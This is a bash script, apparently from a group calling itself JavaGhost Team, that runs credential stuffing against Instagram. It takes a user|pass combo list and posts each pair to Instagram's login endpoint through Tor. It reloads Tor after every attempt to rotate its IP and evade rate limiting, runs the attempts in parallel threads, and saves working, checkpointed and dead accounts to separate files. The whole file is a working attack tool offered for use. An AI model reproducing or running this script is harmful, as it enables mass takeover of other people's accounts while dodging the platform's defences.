# !/bin/bash
# created by : ./Lolz ( JavaGhost Team )
# found some error ? contact me : https://fb.me/n00b.me

# color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

# checking dependencies
dependencies=("curl" "tor" "jq")
for i in "${dependencies[@]}"
do
    command -v $i >/dev/null 2>&1 || {
        echo -e >&2 "${white}[ ${red}ERROR ${white}] Package ${green}${i} ${red}: ${white}Not installed ${red}- ${white}install first please, and run again my tools."
        exit
    }
done

# checking run tor
check_tor=$(curl --socks5-hostname localhost:9050 -s "https://www.google.com" > /dev/null; echo $?)
if [[ $check_tor -gt 0 ]]; then
	echo -e "${white}[ ${red}ERROR ${white}] TOR not runing! ${red}- ${white}run with type 'tor' in your terminal"
	exit
fi

# start
# token
token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)

# banner
echo -e '''
                \e[1;32m+---------{ JavaGhost }---------+\e[1;37m
                \e[1;33m┬┌┐┌┌─┐┌┬┐┌─┐┌─┐┬ ┬┌─┐┌─┐┬┌─┌─┐┬─┐\e[1;37m
                \e[1;33m││││└─┐ │ ├─┤│  ├─┤├┤ │  ├┴┐├┤ ├┬┘\e[1;37m
                \e[1;33m┴┘└┘└─┘ ┴ ┴ ┴└─┘┴ ┴└─┘└─┘┴ ┴└─┘┴└─\e[1;37m
'''

# read input
echo -e "${white}[ ${green}INFO ${white}] Use delimiter ${green}'${red}|${green}' ${white}for combo list ${red}[ ${green}example ${red}:${green} user${red}|${green}pass${red} ]${white}"
echo -ne "${white}[ ${green}? ${white}] Input combo list ${red}:${green} "
read ask_list
if [[ ! -e $ask_list ]]; then
	echo -e "${white}[ ${red}ERROR ${white}] File ${green}'${red}$ask_list${green}' ${white}not found in your directory"
else
	echo -e "${white}[ ${green}+ ${white}] Total combo list ${red}:${green} $(< $ask_list wc -l)"
	echo -ne "${white}[ ${green}? ${white}] Thread to use ${red}:${green} "
	read ask_thread
	echo ""
fi

# login
function login_account(){
	check_login=$(curl --socks5-hostname localhost:9050 -c Cookies.tmp -sXPOST "https://www.instagram.com/accounts/login/ajax/" \
                			-H "cookie: csrftoken=${token}" \
                			-H "origin: https://www.instagram.com" \
                			-H "referer: https://www.instagram.com/accounts/login/" \
                			-H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
                			-H "x-csrftoken: ${token}" \
                			-H "x-requested-with: XMLHttpRequest" \
                			-d "username=$(echo $account | cut -d "|" -f1)&password=$(echo $account | cut -d "|" -f2)") ; true_login=$(echo $check_login | jq -r '.authenticated')
                			if [[ $true_login =~ "true" ]]; then
                				echo -e "${white}  [ ${green}LIVE ${white}] ${blue}- ${green}${account}"
                				echo $account >> account_live.txt
                				killall -HUP tor
                			elif [[ $check_login =~ "checkpoint_required" ]]; then
                				echo -e "${white}  [ ${blue}CHECKPOINT ${white}] ${blue}- ${white}${account}"
                				echo $account >> account_checkpoint.txt
                				killall -HUP tor
                			elif [[ $check_login =~ "false" ]]; then
                				echo -e "${white}  [ ${red}DEAD ${white}] ${blue}- ${red}${account}"
                				echo $account >> account_dead.txt
                				killall -HUP tor
                			else
                				echo -e "${white}  [ ${cyan}UNCHECK ${white}] ${blue}- ${white}${account}"
                				echo $account >> account_uncheck.txt
                				killall -HUP tor
	                		fi
}

# multithread
(
	for account in $(cat $ask_list); do
		((thread=thread%$ask_thread)); ((thread++==0)) && wait
		login_account "$account" &
	done
	wait
)

# checking file
if [[ ! -e account_live.txt ]]; then
	echo -e "${white}\n[ ${red}- ${white}] Ups you don't get any account ${red}-${white} try again use good combos XD"
else
	echo -e "${white}\n[ ${green}+ ${white}] Total account instagram live ${red}:${green} $(< account_live.txt wc -l)${white}"
fi
# end
